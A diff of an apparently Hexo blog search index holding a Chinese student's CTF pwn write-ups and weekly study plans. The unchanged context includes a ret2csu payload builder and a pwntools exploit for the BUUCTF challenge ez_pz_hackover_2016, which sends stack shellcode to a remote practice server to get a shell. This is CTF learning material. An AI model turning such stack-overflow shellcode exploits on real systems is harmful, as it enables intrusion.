@@ -19,7 +19,7 @@
 ]]></content>
   </entry>
   <entry>
-    <title>pwn日常刷题记录</title>
+    <title>pwn栈刷题记录</title>
     <url>/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h1 id="栈问题"><a href="#栈问题" class="headerlink" title="栈问题"></a>栈问题</h1><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p><strong>checksec</strong></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
@@ -109,7 +109,7 @@
 <p>$rdx&#x3D;&#x3D;0</p>
 <p>syscall</p>
 <p>def ret_csu(r12, r13, r14, r15, last):<br>    payload &#x3D; offset * ‘a’<br>    #构造栈溢出的padding<br>    payload +&#x3D; p64(first_csu) + ‘a’ * 8<br>    #gadgets1的地址<br>    payload +&#x3D; p64(0) + p64(1)<br>    #rbx&#x3D;0, rbp&#x3D;1<br>    payload +&#x3D; p64(r12)<br>    #call调用的地址<br>    payload +&#x3D; p64(r13) + p64(r14) + p64(r15)<br>    #三个参数的寄存器<br>    payload +&#x3D; p64(second_csu)<br>    #gadgets2的地址<br>    payload +&#x3D; ‘a’ * 56<br>    #pop出的padding<br>    payload +&#x3D; p64(last)<br>    #函数最后的返回地址<br>    return payload</p>
-<h3 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h3><p>‘’’<br>调试脚本</p>
+<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>‘’’<br>调试脚本</p>
 <p>from pwn import *<br>context(log_level &#x3D; ‘debug’,os&#x3D;’linux’,arch&#x3D;’i386’)<br>p &#x3D; process(‘.&#x2F;ez’)<br>gdb.attach(p)<br>p.recvuntil(‘crash: ‘)<br>stack_addr &#x3D; int(p.recv(10), 16)<br>payload &#x3D; b’crashme\x00’ + b’a’*18<br>payload +&#x3D; p32(0) + asm(shellcraft.sh())<br>p.recvuntil(‘&gt; ‘)<br>p.sendline(payload)<br>pause()<br>p.interactive()<br>‘’’<br>#coding&#x3D;utf-8<br>from pwn import *<br>context.log_level &#x3D; ‘debug’<br>p&#x3D;remote(‘node4.buuoj.cn’,25049)<br>shellcode &#x3D; asm(shellcraft.sh())<br>p.recvuntil(‘lets crash: ‘)<br>stack_addr &#x3D; int(p.recv(10),16)<br>shellcode_addr &#x3D; stack_addr-28<br>payload &#x3D; b’crashme\x00’.ljust(26,b”\x00”)<br>payload +&#x3D; p32(shellcode_addr)+shellcode<br>p.recvuntil(‘&gt;’)<br>p.sendline(payload)<br>p.interactive()</p>
 ]]></content>
       <categories>
@@ -120,6 +120,11 @@
       </tags>
   </entry>
   <entry>
+    <title>pwn</title>
+    <url>/2023/04/10/pwn/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>内核学习</title>
     <url>/2023/03/14/%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[]]></content>
@@ -127,9 +132,9 @@
   <entry>
     <title>周计划</title>
     <url>/2023/03/04/%E5%91%A8%E8%AE%A1%E5%88%92-1/</url>
-    <content><![CDATA[<h1 id="大一下学期目标"><a href="#大一下学期目标" class="headerlink" title="大一下学期目标"></a>大一下学期目标</h1><p><strong>主线</strong>：<strong>学习pwn的栈 堆和内核</strong></p>
+    <content><![CDATA[<h1 id="大一下学期目标"><a href="#大一下学期目标" class="headerlink" title="大一下学期目标"></a>大一下学期目标</h1><p><strong>主线</strong>：<strong>学习pwn的栈 堆和内核，学习计算机系统基础</strong></p>
 <p><strong>主线</strong>：<strong>完成现代c++的学习</strong></p>
-<p><strong>完成《深入了解操作系统》的阅读以及lab的练习</strong></p>
+<p><strong>《深入了解操作系统》的阅读以及lab的练习</strong></p>
 <p><strong>完成<em>MIT.6S081</em>课程学习和lab的练习</strong></p>
 <h2 id="第4周"><a href="#第4周" class="headerlink" title="第4周"></a>第4周</h2><p>总目标：</p>
 <p><strong>现代c++：</strong>part1，part2 </p>
@@ -186,7 +191,15 @@
 <p>1：从本周开始：现代c++的学习先暂停，开启慕课计算机基础的学习</p>
 <p>2.继续坚持ctfpwn方向的刷题和学习</p>
 <p>3.开始学习其他的方向：re，web，密码</p>
-]]></content>
+<h3 id="周一-4"><a href="#周一-4" class="headerlink" title="周一"></a>周一</h3><p>计算机系统基础：第一周：计算机系统概述</p>
+<h3 id="周二周三"><a href="#周二周三" class="headerlink" title="周二周三"></a>周二周三</h3><p>摆烂了</p>
+<h3 id="周四-3"><a href="#周四-3" class="headerlink" title="周四"></a>周四</h3><p>继续摆烂，练几道re</p>
+<h3 id="周五周六"><a href="#周五周六" class="headerlink" title="周五周六"></a>周五周六</h3><p>摆烂的情况下慢慢推进pwn的堆学习</p>
+<h3 id="周日-2"><a href="#周日-2" class="headerlink" title="周日"></a>周日</h3><p>继续学习pwn的堆(以后一定要用更多时间学习，真的难了)</p>
+<h2 id="第九周"><a href="#第九周" class="headerlink" title="第九周"></a>第九周</h2><p>总目标：</p>
+<p>计算机基础慢慢听</p>
+<p>加速推进pwn的学习</p>
+<h3 id="周一-5"><a href="#周一-5" class="headerlink" title="周一"></a>周一</h3>]]></content>
       <categories>
         <category>计划</category>
       </categories>
